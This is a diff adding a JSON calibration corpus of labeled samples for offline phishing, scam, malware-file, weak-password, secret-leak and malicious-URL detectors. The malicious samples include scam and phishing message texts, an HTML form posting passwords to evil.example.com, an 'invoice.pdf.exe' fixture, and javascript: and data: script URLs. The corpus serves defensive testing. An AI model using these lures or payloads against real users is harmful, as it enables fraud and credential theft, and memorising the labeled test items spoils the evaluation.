@@ -1,0 +1,302 @@
+{
+ "comment": "Labeled calibration corpus for the offline engines (spec \u00a710). label=malicious means the engine must call it positive at its documented threshold; label=benign means it must not. Samples are synthetic or well-known test fixtures \u2014 no real victim data, no live credentials.",
+ "email": [
+  {
+   "input": {
+    "body": "Urgent wire transfer needed. Our bank account has changed \u2014 remit payment to the new beneficiary account and keep this confidential.",
+    "headers": "From: CEO <ceo@company.com>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n"
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "body": "Verify now or your account will be closed. Enter your password to confirm.",
+    "headers": "From: PayPal Security <alert@paypa1-secure.xyz>\nAuthentication-Results: mx; spf=fail dkim=fail dmarc=fail\n"
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "body": "Please update my direct deposit \u2014 salary will be paid to a new account from this month.",
+    "headers": "From: HR <hr@company.com>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n"
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "body": "<form action=\"https://evil.example.com/collect\"><input type=\"password\" name=\"p\"></form>",
+    "headers": "From: IT <it@company.com>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n"
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "body": "Hi team, the sprint board is updated. Please review your tickets before standup tomorrow.",
+    "headers": "From: Priya <priya@company.com>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\nSubject: Sprint board\n"
+   },
+   "label": "benign"
+  },
+  {
+   "input": {
+    "body": "A new sign-in was recorded for your account from Jaipur, India. If this was you, no action is needed.",
+    "headers": "From: GitHub <notifications@github.com>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n"
+   },
+   "label": "benign"
+  },
+  {
+   "input": {
+    "body": "The book you reserved is ready for pickup at the front desk.",
+    "headers": "From: Library <library@university.edu>\nAuthentication-Results: mx; spf=pass dkim=pass dmarc=pass\n"
+   },
+   "label": "benign"
+  }
+ ],
+ "file": [
+  {
+   "input": {
+    "base64": "TVoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "filename": "invoice.pdf.exe"
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "base64": "JVBERi0xLjUgZmFrZSAvSmF2YVNjcmlwdCAvT3BlbkFjdGlvbiBjb250ZW50",
+    "filename": "statement.pdf"
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "base64": "TWVldGluZyBub3RlczogYnJpbmcgeW91ciBsYXB0b3AgYW5kIGNvZmZlZS4=",
+    "filename": "notes.txt"
+   },
+   "label": "benign"
+  },
+  {
+   "input": {
+    "base64": "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AvwH/2Q==",
+    "filename": "photo.jpg"
+   },
+   "label": "benign"
+  }
+ ],
+ "message": [
+  {
+   "input": "Your parcel is held at customs. Pay a clearance fee of Rs 49 now: http://track-parcel.xyz",
+   "label": "malicious"
+  },
+  {
+   "input": "I am a CBI officer. You are under digital arrest for money laundering. Do not tell anyone, stay on the call.",
+   "label": "malicious"
+  },
+  {
+   "input": "Hi mum, this is my new number. I am in trouble, please send money urgently, do not tell anyone.",
+   "label": "malicious"
+  },
+  {
+   "input": "Share your OTP immediately or your account will be blocked within 24 hours.",
+   "label": "malicious"
+  },
+  {
+   "input": "Join our Telegram task scam group: earn per day, per task, guaranteed returns, double your money.",
+   "label": "malicious"
+  },
+  {
+   "input": "You have won a lottery prize! Claim your prize now, offer expires today.",
+   "label": "malicious"
+  },
+  {
+   "input": "Your income tax refund is pending. Claim your refund here: http://refund-claim.top",
+   "label": "malicious"
+  },
+  {
+   "input": "Microsoft support: your computer has a virus, install AnyDesk now and call our support team.",
+   "label": "malicious"
+  },
+  {
+   "input": "Your bank never asks for OTP. Never share your OTP, PIN or CVV with anyone.",
+   "label": "benign"
+  },
+  {
+   "input": "Hi mum, dinner at 8 tomorrow? I will bring dessert.",
+   "label": "benign"
+  },
+  {
+   "input": "Your order has been delivered. Thank you for shopping with us.",
+   "label": "benign"
+  },
+  {
+   "input": "Reminder: team lunch on Friday at 1 pm in the cafeteria.",
+   "label": "benign"
+  },
+  {
+   "input": "Your parcel will arrive tomorrow between 10 am and 2 pm.",
+   "label": "benign"
+  },
+  {
+   "input": "The meeting is rescheduled to Monday 11 am. See you there.",
+   "label": "benign"
+  }
+ ],
+ "password": [
+  {
+   "input": "password",
+   "label": "malicious"
+  },
+  {
+   "input": "qwerty123",
+   "label": "malicious"
+  },
+  {
+   "input": "P@ssw0rd2024",
+   "label": "malicious"
+  },
+  {
+   "input": "123456789012",
+   "label": "malicious"
+  },
+  {
+   "input": "Tr7!mango-BICYCLE-92#quartz",
+   "label": "benign"
+  },
+  {
+   "input": "correct-horse-Battery-7!staple",
+   "label": "benign"
+  },
+  {
+   "input": "X9#vQ2!mZ8$pL4&nR7",
+   "label": "benign"
+  }
+ ],
+ "secret": [
+  {
+   "input": {
+    "join": [
+     "aws_access_key_id = AKIAIOSFOD",
+     "NN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI",
+     "K7MDENGbPxRfiCYEXAMPLEKEY"
+    ]
+   },
+   "label": "malicious"
+  },
+  {
+   "input": {
+    "join": [
+     "DATABASE_URL=postgres://admin:Sup3r",
+     "SecretPW@db.example.com:5432/app"
+    ]
+   },
+   "label": "malicious"
+  },
+  {
+   "input": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA",
+   "label": "malicious"
+  },
+  {
+   "input": "card 4111 1111 1111 1111 exp 12/29",
+   "label": "malicious"
+  },
+  {
+   "input": "def add(a, b):\n    return a + b\n\nprint(add(2, 3))",
+   "label": "benign"
+  },
+  {
+   "input": "api_key = \"<redacted>\"\n# TODO: rotate before launch",
+   "label": "benign"
+  },
+  {
+   "input": "Team lunch on Friday, bring your own cup. Agenda: sprint retro and roadmap.",
+   "label": "benign"
+  }
+ ],
+ "thresholds": {
+  "email": 40,
+  "file": 20,
+  "message": 40,
+  "secret": 40,
+  "url": 40
+ },
+ "url": [
+  {
+   "input": "http://192.168.10.5/paypal/login/verify",
+   "label": "malicious"
+  },
+  {
+   "input": "http://paypa1-secure.xyz/verify/login",
+   "label": "malicious"
+  },
+  {
+   "input": "https://paypal-secure.pages.dev/verify",
+   "label": "malicious"
+  },
+  {
+   "input": "javascript:alert(1)",
+   "label": "malicious"
+  },
+  {
+   "input": "http://2130706433/admin",
+   "label": "malicious"
+  },
+  {
+   "input": "http://secure-login-verify.top/account/update/confirm",
+   "label": "malicious"
+  },
+  {
+   "input": "https://accounts.google.com.verify-account.example.net/signin",
+   "label": "malicious"
+  },
+  {
+   "input": "http://apple-id-verify.click/login",
+   "label": "malicious"
+  },
+  {
+   "input": "http://xn--pypl-53dc.com/login",
+   "label": "malicious"
+  },
+  {
+   "input": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+   "label": "malicious"
+  },
+  {
+   "input": "https://www.paypal.com/signin",
+   "label": "benign"
+  },
+  {
+   "input": "https://github.com/Manoj-2424150118/aegis-cyber-defense-platform",
+   "label": "benign"
+  },
+  {
+   "input": "https://en.wikipedia.org/wiki/Phishing",
+   "label": "benign"
+  },
+  {
+   "input": "https://www.google.com/search?q=weather+jaipur",
+   "label": "benign"
+  },
+  {
+   "input": "https://docs.python.org/3/library/ipaddress.html",
+   "label": "benign"
+  },
+  {
+   "input": "https://www.amazon.in/dp/B0CEXAMPLE",
+   "label": "benign"
+  },
+  {
+   "input": "https://www.google.co.in/search?q=news",
+   "label": "benign"
+  },
+  {
+   "input": "https://www.bbc.com/news",
+   "label": "benign"
+  },
+  {
+   "input": "https://www.hdfcbank.com/personal/login",
+   "label": "benign"
+  },
+  {
+   "input": "https://example.com/",
+   "label": "benign"
+  }
+ ]
+}
